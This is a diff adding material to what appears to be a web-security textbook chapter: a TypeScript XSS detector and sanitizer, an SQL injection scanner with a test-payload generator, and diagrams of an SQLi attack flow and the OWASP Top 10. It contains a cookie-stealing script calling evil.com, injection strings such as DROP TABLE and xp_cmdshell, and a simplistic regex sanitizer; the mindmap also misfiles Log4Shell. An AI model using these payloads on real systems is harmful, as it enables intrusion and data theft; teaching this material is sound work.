@@ -1259,7 +1259,7 @@ Industry benchmarks:
 ### Challenge Problem
 
 Design a complete security architecture for an e-commerce application considering: OWASP Top 10, WAF rules, CSP, SSRF prevention, session management, file upload restrictions, and third-party script integrity. Include a threat model using STRIDE.
-### Chapter Quiz
+## Chapter Quiz
 
 1. Which OWASP Top 10 (2021) category has the highest exploitability score?
    - A) A01 → Broken Access Control
@@ -2733,6 +2733,585 @@ testssl.sh --quiet https://target.com
 
 curl -sI https://target.com | grep -i -E "security|policy|frame|content"
 
+```
+
+## TypeScript Implementations
+
+### XSS Sanitizer & Detector
+
+The following TypeScript class implements a comprehensive XSS detection and sanitization engine. It scans input for reflected, stored, and DOM-based XSS vectors including script tags, event handlers, javascript: URLs, and eval() patterns. The sanitizer strips dangerous content while preserving safe HTML.
+
+```typescript
+/**
+ * XSSFinding — describes a detected XSS vulnerability
+ * @property type — classification of XSS (stored, reflected, or DOM-based)
+ * @property payload — the malicious snippet discovered
+ * @property severity — risk level based on OWASP guidelines
+ * @property vulnerableParam — the input parameter or DOM sink that carried the payload
+ */
+interface XSSFinding {
+  type: 'stored' | 'reflected' | 'dom';
+  payload: string;
+  severity: 'low' | 'medium' | 'high' | 'critical';
+  vulnerableParam: string;
+}
+
+/**
+ * XSSDetector — scans user-controlled input for XSS attack vectors
+ * and provides a sanitize() method that strips dangerous constructs.
+ *
+ * Covered attack surfaces:
+ * - Script tag injection: <script>alert(1)</script>
+ * - Event handler attributes: onerror, onload, onfocus, onmouseover
+ * - javascript: URL scheme in links and iframes
+ * - eval() / setTimeOut(string) patterns
+ * - Data URI with embedded HTML
+ * - Polyglot / mixed-case bypass attempts
+ */
+class XSSDetector {
+  /**
+   * Regex patterns that match common XSS vectors.
+   * Ordered by specificity (most specific first) to reduce false positives.
+   */
+  private static readonly XSS_PATTERNS: RegExp[] = [
+    // Script tags with or without attributes
+    /<script[\s>]/gi,
+    /<\/script>/gi,
+    // Inline event handlers (onerror, onload, onfocus, onmouseover, onclick, etc.)
+    /\bon\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi,
+    // javascript: / vbscript: / data: URIs (common in href/src)
+    /\b(?:javascript|vbscript|data)\s*:/gi,
+    // eval() / setTimeout(string) / setInterval(string) / new Function()
+    /\beval\s*\(/gi,
+    /\bsetTimeout\s*\(\s*["']/gi,
+    /\bsetInterval\s*\(\s*["']/gi,
+    /\bnew\s+Function\s*\(/gi,
+    // document.write() with user data
+    /document\.write\s*\(/gi,
+    // innerHTML / outerHTML assignment sinks
+    /\.innerHTML\s*=/gi,
+    /\.outerHTML\s*=/gi,
+    // Expressions inside template literals (potential DOM clobber)
+    /\$\{[^}]+\}/gi,
+  ];
+
+  /**
+   * Detect XSS vectors in the given input string.
+   * Returns an array of XSSFinding objects, one per matched pattern.
+   */
+  public detectXSS(input: string): XSSFinding[] {
+    const findings: XSSFinding[] = [];
+
+    for (const pattern of XSSDetector.XSS_PATTERNS) {
+      let match: RegExpExecArray | null;
+      const cloned = new RegExp(pattern.source, pattern.flags);
+
+      while ((match = cloned.exec(input)) !== null) {
+        const payload = match[0];
+        const type = this.classifyPayload(payload);
+        findings.push({
+          type,
+          payload: payload.length > 120 ? payload.slice(0, 120) + '…' : payload,
+          severity: this.assessSeverity(payload, type),
+          vulnerableParam: this.identifyParam(input, match.index),
+        });
+      }
+    }
+    return findings;
+  }
+
+  /**
+   * Classify whether the payload is more likely stored, reflected, or DOM-based.
+   * Uses heuristic rules based on payload structure.
+   */
+  private classifyPayload(payload: string): XSSFinding['type'] {
+    const lower = payload.toLowerCase();
+    if (
+      lower.includes('innerhtml') ||
+      lower.includes('outerhtml') ||
+      lower.includes('document.write')
+    ) {
+      return 'dom';
+    }
+    if (
+      lower.includes('src=') ||
+      lower.includes('href=') ||
+      lower.includes('data:')
+    ) {
+      return 'reflected';
+    }
+    return 'stored';
+  }
+
+  /**
+   * Assess severity based on payload characteristics and type.
+   */
+  private assessSeverity(
+    payload: string,
+    type: XSSFinding['type']
+  ): XSSFinding['severity'] {
+    const lower = payload.toLowerCase();
+    if (
+      type === 'stored' &&
+      (lower.includes('document.cookie') || lower.includes('fetch('))
+    ) {
+      return 'critical';
+    }
+    if (
+      type === 'dom' &&
+      (lower.includes('eval') || lower.includes('new function'))
+    ) {
+      return 'high';
+    }
+    if (lower.includes('alert') || lower.includes('prompt')) {
+      return 'medium';
+    }
+    return 'low';
+  }
+
+  /**
+   * Identify the vulnerable parameter by looking back from the match index.
+   * This is a simplified heuristic for demonstration.
+   */
+  private identifyParam(input: string, matchIndex: number): string {
+    const before = input.slice(0, matchIndex);
+    const paramMatch = before.match(/[?&](\w+)=/);
+    return paramMatch ? paramMatch[1] : 'unknown';
+  }
+
+  /**
+   * Sanitize input by stripping or encoding dangerous constructs.
+   * This is a defense-in-depth approach — never rely solely on sanitization;
+   * always pair with context-aware output encoding.
+   *
+   * Strategy:
+   * 1. Normalize dangerous keywords (mixed-case → lowercase for matching)
+   * 2. Remove script tags entire blocks
+   * 3. Strip event handler attributes
+   * 4. Neutralize javascript:/data: URIs
+   * 5. Encode remaining < > & " ' to HTML entities
+   */
+  public sanitize(input: string): string {
+    let safe = input;
+
+    // Step 1: Remove <script> ... </script> blocks (including nested)
+    safe = safe.replace(/<script[\s>][\s\S]*?<\/script\s*>/gi, '');
+
+    // Step 2: Remove stand-alone </script> (e.g., from broken injection)
+    safe = safe.replace(/<\/script\s*>/gi, '');
+
+    // Step 3: Strip event handler attributes
+    safe = safe.replace(/\s+on\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '');
+
+    // Step 4: Neutralize javascript:/vbscript:/data: URIs in attributes
+    safe = safe.replace(
+      /(href|src|action|formaction)\s*=\s*(?:"|')?\s*(?:javascript|vbscript|data)\s*:/gi,
+      '$1="about:blank" /* blocked */'
+    );
+
+    // Step 5: Encode HTML-special characters for display safety
+    const htmlEntities: Record<string, string> = {
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#x27;',
+    };
+    safe = safe.replace(/[&<>"']/g, (ch) => htmlEntities[ch] ?? ch);
+
+    return safe;
+  }
+}
+
+// ---- Usage example ----
+const detector = new XSSDetector();
+
+const maliciousInput = `{
+  "name": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
+  "bio": "<img src=x onerror=\\"eval(atob('YWxlcnQoMSk='))\\">",
+  "website": "javascript:alert(1)"
+}`;
+
+const findings = detector.detectXSS(maliciousInput);
+console.log(`Detected ${findings.length} XSS vector(s):`);
+for (const f of findings) {
+  console.log(`  [${f.severity.toUpperCase()}] ${f.type}: ${f.payload}`);
+}
+
+const sanitized = detector.sanitize(maliciousInput);
+console.log(`\nSanitized output:\n${sanitized}`);
+```
+
+### SQL Injection Scanner
+
+This TypeScript class implements a multi-strategy SQL Injection scanner. It tests payloads against common injection types: UNION-based extraction, error-based inference, blind boolean, time-based delays, and stacked queries. The scanner also generates tailored test payloads for different database backends.
+
+```typescript
+/**
+ * SQLiFinding — describes a detected SQL injection vulnerability
+ * @property endpoint — the URL or API path where the injection was found
+ * @property parameter — the vulnerable input parameter
+ * @property payload — the injection string that triggered the finding
+ * @property dbType — the suspected database management system
+ * @property riskLevel — qualitative risk assessment
+ */
+interface SQLiFinding {
+  endpoint: string;
+  parameter: string;
+  payload: string;
+  dbType: 'mysql' | 'postgresql' | 'mssql' | 'oracle';
+  riskLevel: 'low' | 'medium' | 'high' | 'critical';
+}
+
+/**
+ * SQLiTestResult — captures the outcome of a single probe
+ */
+interface SQLiTestResult {
+  payload: string;
+  detected: boolean;
+  responseTime: number;
+  errorPattern: string | null;
+  rowCountDelta: boolean;
+}
+
+/**
+ * SQLiScanner — scans payload strings for SQL injection indicators
+ * and generates differentiated test payloads for each major DBMS.
+ *
+ * Attack vectors covered:
+ * - UNION-based extraction: appends result sets to the original query
+ * - Error-based inference: triggers DB errors that leak information
+ * - Blind boolean: observes true/false page differences
+ * - Time-based: uses SLEEP/WAITFOR DELAY to confirm injection
+ * - Boolean-based: uses AND/OR conditional logic
+ * - Stacked queries: executes multiple statements (MSSQL/PostgreSQL)
+ */
+class SQLiScanner {
+  /**
+   * DB-specific error fingerprints used to identify the backend.
+   */
+  private static readonly DB_ERROR_PATTERNS: Record<
+    SQLiFinding['dbType'],
+    RegExp[]
+  > = {
+    mysql: [
+      /you have an error in your sql/i,
+      /mysql_fetch/i,
+      /sqlstate\[/i,
+      /incorrect syntax near/i,
+    ],
+    postgresql: [
+      /psql/i,
+      /pg_/i,
+      /postgresql/i,
+      /invalid input syntax/i,
+    ],
+    mssql: [
+      /microsoft oledb/i,
+      /sql server/i,
+      /incorrect syntax near/i,
+      /unclosed quotation mark/i,
+    ],
+    oracle: [
+      /ora-\d{5}/i,
+      /oracle/i,
+      /pls-/i,
+      /quoted string not properly terminated/i,
+    ],
+  };
+
+  /**
+   * Scan a single payload string for SQL injection indicators.
+   * Returns an array of findings (usually 0 or 1 for a single payload),
+   * but a complex payload may trigger multiple DB patterns.
+   */
+  public scanPayload(payload: string): SQLiFinding[] {
+    const findings: SQLiFinding[] = [];
+    const lower = payload.toLowerCase().trim();
+
+    // Determine which DB type(s) the payload targets
+    const dbTypes = this.identifyTargetDB(payload);
+
+    for (const dbType of dbTypes) {
+      const riskLevel = this.assessRisk(payload, dbType);
+      findings.push({
+        endpoint: '(dynamic)',
+        parameter: 'input',
+        payload: payload.length > 120 ? payload.slice(0, 120) + '…' : payload,
+        dbType,
+        riskLevel,
+      });
+    }
+    return findings;
+  }
+
+  /**
+   * Identify the most likely DBMS targeted by the payload.
+   * Uses DB-specific syntax markers (comment styles, functions, keywords).
+   */
+  private identifyTargetDB(payload: string): SQLiFinding['dbType'][] {
+    const dbs: SQLiFinding['dbType'][] = [];
+    const lower = payload.toLowerCase();
+
+    // MySQL-specific: --, #, /*! */, SLEEP(), BENCHMARK(), @@version
+    if (
+      lower.includes('sleep(') ||
+      lower.includes('benchmark(') ||
+      lower.includes('@@version') ||
+      lower.includes("' --") ||
+      lower.includes("'#")
+    ) {
+      dbs.push('mysql');
+    }
+
+    // PostgreSQL-specific: :: cast, pg_sleep, current_database()
+    if (
+      lower.includes('pg_sleep') ||
+      lower.includes('::text') ||
+      lower.includes('current_database')
+    ) {
+      dbs.push('postgresql');
+    }
+
+    // MSSQL-specific: @@version (shared with MySQL), WAITFOR DELAY, char()
+    if (
+      lower.includes('waitfor delay') ||
+      lower.includes('@@version') ||
+      lower.includes('char(')
+    ) {
+      dbs.push('mssql');
+    }
+
+    // Oracle-specific: dual table, rownum, utl_inaddr, ctxsys
+    if (
+      lower.includes('from dual') ||
+      lower.includes('rownum') ||
+      lower.includes('utl_inaddr')
+    ) {
+      dbs.push('oracle');
+    }
+
+    // If no specific markers, flag as MySQL (most common)
+    if (dbs.length === 0) {
+      dbs.push('mysql', 'postgresql', 'mssql', 'oracle');
+    }
+
+    return [...new Set(dbs)];
+  }
+
+  /**
+   * Assess risk based on payload intent and target DB.
+   * UNION-based and stacked queries are critical;
+   * error-based is high; boolean/time-based is medium; simple probes are low.
+   */
+  private assessRisk(
+    payload: string,
+    _dbType: SQLiFinding['dbType']
+  ): SQLiFinding['riskLevel'] {
+    const lower = payload.toLowerCase();
+    if (lower.includes('union') && lower.includes('select')) return 'critical';
+    if (lower.includes(';') && lower.includes('drop')) return 'critical';
+    if (lower.includes('exec') || lower.includes('xp_cmdshell')) return 'critical';
+    if (lower.includes('convert(') || lower.includes('cast(')) return 'high';
+    if (
+      lower.includes('sleep(') ||
+      lower.includes('waitfor delay') ||
+      lower.includes('pg_sleep')
+    ) {
+      return 'medium';
+    }
+    if (lower.includes("' or ") || lower.includes("' and ")) return 'medium';
+    return 'low';
+  }
+
+  /**
+   * Generate an array of test payloads based on a base parameter value.
+   * Each payload targets a different SQLi technique and DBMS.
+   */
+  public generateTestPayloads(baseParam: string): string[] {
+    const encoded = encodeURIComponent(baseParam);
+    return [
+      // --- Boolean-based ---
+      `' OR '1'='1`,                        // MySQL/MSSQL true
+      `' OR '1'='2`,                        // MySQL/MSSQL false
+      `" OR "1"="1`,                        // Double-quote variant
+      `' OR 1=1 --`,                        // Comment-terminated true
+      `' OR 1=2 --`,                        // Comment-terminated false
+      `' AND 1=1 --`,                       // AND true
+      `' AND 1=2 --`,                       // AND false
+
+      // --- UNION-based extraction ---
+      `' UNION SELECT NULL --`,             // Column count probe (MySQL)
+      `' UNION SELECT NULL,NULL --`,
+      `' UNION SELECT NULL,NULL,NULL --`,
+      `' UNION SELECT @@version,NULL,NULL --`,   // Version extraction (MySQL/MSSQL)
+      `' UNION SELECT current_database(),NULL,NULL --`, // DB name (PostgreSQL)
+
+      // --- Error-based ---
+      `' AND 1=CONVERT(int, @@version) --`, // MSSQL error-based
+      `' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version)) --`, // MySQL error-based
+      `' AND UTL_INADDR.get_host_name('127.0.0.1') IS NOT NULL --`, // Oracle error
+
+      // --- Time-based ---
+      `' OR SLEEP(5) --`,                  // MySQL time-based
+      `' OR pg_sleep(5) --`,               // PostgreSQL time-based
+      `'; WAITFOR DELAY '0:0:5' --`,       // MSSQL time-based
+      `' OR BENCHMARK(5000000, MD5('test')) --`, // MySQL CPU-based delay
+
+      // --- Stacked queries ---
+      `'; DROP TABLE users --`,            // Destructive stacked (MSSQL/PostgreSQL)
+      `'; EXEC xp_cmdshell('dir') --`,     // MSSQL command execution
+
+      // --- Out-of-band (DNS) ---
+      `'; DECLARE @q VARCHAR(8000) SELECT @q=0x EXEC master.dbo.xp_dirtree @q --`,
+
+      // --- NoSQL injection patterns ---
+      `{ "$gt": "" }`,                     // MongoDB $gt operator
+      `{ "$ne": "" }`,                     // MongoDB $ne operator
+    ];
+  }
+
+  /**
+   * Simulate a full scan against a set of payloads, returning all findings.
+   * In a real scanner, each payload would be sent to the target endpoint
+   * and the HTTP response analyzed. Here we perform static analysis only.
+   */
+  public scanAll(payloads: string[]): SQLiFinding[] {
+    const allFindings: SQLiFinding[] = [];
+    for (const payload of payloads) {
+      const results = this.scanPayload(payload);
+      allFindings.push(...results);
+    }
+    return allFindings;
+  }
+}
+
+// ---- Usage example ----
+const scanner = new SQLiScanner();
+
+// Generate test payloads from a base parameter
+const payloads = scanner.generateTestPayloads('1');
+console.log(`Generated ${payloads.length} test payloads.\n`);
+
+// Scan a specific malicious payload
+const malicious = "' UNION SELECT username, password FROM users --";
+const findings = scanner.scanPayload(malicious);
+console.log(`Scanning: ${malicious}`);
+for (const f of findings) {
+  console.log(
+    `  → [${f.riskLevel.toUpperCase()}] ${f.dbType}: matched injection pattern`
+  );
+}
+```
+
+## Mermaid Diagrams
+
+### SQL Injection Attack Flow
+
+The following sequence diagram illustrates the two primary paths of SQL injection: **error-based** injection (where database error messages leak schema information) and **UNION-based** injection (where the attacker appends result sets to extract data directly). Both paths exploit unsanitized user input concatenated into SQL queries.
+
+```mermaid
+sequenceDiagram
+    participant Attacker
+    participant WebApp as Web Application
+    participant DB as Database Server
+
+    Note over Attacker,DB: SQL Injection Attack Flow
+
+    rect rgb(240, 240, 255)
+    Note over Attacker,WebApp: Step 1 — Reconnaissance
+    Attacker->>WebApp: GET /product?id=1'
+    WebApp->>DB: SELECT * FROM products WHERE id = '1''
+    DB-->>WebApp: ERROR: syntax error at or near "''"
+    WebApp-->>Attacker: 500 Internal Server Error (verbose)
+    end
+
+    rect rgb(240, 255, 240)
+    Note over Attacker,WebApp: Step 2 — Error-Based Injection
+    Attacker->>WebApp: GET /product?id=1' AND 1=CONVERT(int, @@version)--
+    WebApp->>DB: SELECT * FROM products WHERE id = '1' AND 1=CONVERT(int, @@version)--'
+    DB-->>WebApp: ERROR: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019' to int
+    WebApp-->>Attacker: Error message contains SQL Server version
+    Note over Attacker: DB type identified → MSSQL 2019
+    end
+
+    rect rgb(255, 240, 240)
+    Note over Attacker,DB: Step 3 — UNION-Based Extraction
+    Attacker->>WebApp: GET /product?id=1 UNION SELECT username, password FROM users--
+    WebApp->>DB: SELECT * FROM products WHERE id = '1' UNION SELECT username, password FROM users--'
+    DB-->>WebApp: Result set: (admin, hash$123...), (john, hash$456...)
+    WebApp-->>Attacker: Rendered page includes credentials
+    Note over Attacker: Credentials extracted!
+    end
+```
+
+### OWASP Top 10 (2021) Threat Categories
+
+This mindmap illustrates the ten OWASP Top 10 risk categories ranked by exploitation frequency and technical impact. Each category is accompanied by example attack vectors that demonstrate the real-world manifestation of the vulnerability.
+
+```mermaid
+mindmap
+  root(("OWASP Top 10 2021"))
+    A01_Broken_Access_Control
+      ::icon(fa fa-shield)
+      IDOR
+      Privilege_Escalation
+      Missing_Permission_Checks
+      CVE_2021_44228_Log4Shell
+    A02_Cryptographic_Failures
+      ::icon(fa fa-lock)
+      Weak_TLS_1.0_1.1
+      Hardcoded_API_Keys
+      MD5_SHA1_Hashing
+      Missing_Encryption_at_Rest
+    A03_Injection
+      ::icon(fa fa-bolt)
+      SQLi
+      NoSQL_Injection
+      OS_Command_Injection
+      LDAP_Injection
+    A04_Insecure_Design
+      ::icon(fa fa-pencil)
+      Missing_Threat_Modeling
+      No_Rate_Limiting
+      Client_Side_Trust
+      Sequential_IDs
+    A05_Security_Misconfiguration
+      ::icon(fa fa-gear)
+      Default_Credentials
+      Directory_Listing
+      Verbose_Errors
+      CORS_Misconfig
+    A06_Vulnerable_Components
+      ::icon(fa fa-puzzle-piece)
+      Log4Shell_CVE_2021_44228
+      Struts2_CVE_2017_5638
+      Outdated_Libraries
+      SBOM_Violations
+    A07_Identification_Failures
+      ::icon(fa fa-id-card)
+      Weak_Passwords
+      No_MFA
+      Session_Fixation
+      JWT_alg_none
+    A08_Data_Integrity_Failures
+      ::icon(fa fa-check-circle)
+      Unsigned_Updates
+      Insecure_Deserialization
+      Supply_Chain_Tampering
+      Missing_SRI
+    A09_Logging_Monitoring
+      ::icon(fa fa-clock)
+      Missing_Audit_Trails
+      Delayed_Detection_76_days
+      No_SIEM
+      Equifax_Style_Breach
+    A10_SSRF
+      ::icon(fa fa-globe)
+      Cloud_Metadata_Theft
+      Internal_Port_Scanning
+      DNS_Rebinding
+      Capital_One_Breach
 ```
 
 ### Final One-Sentence Takeaway
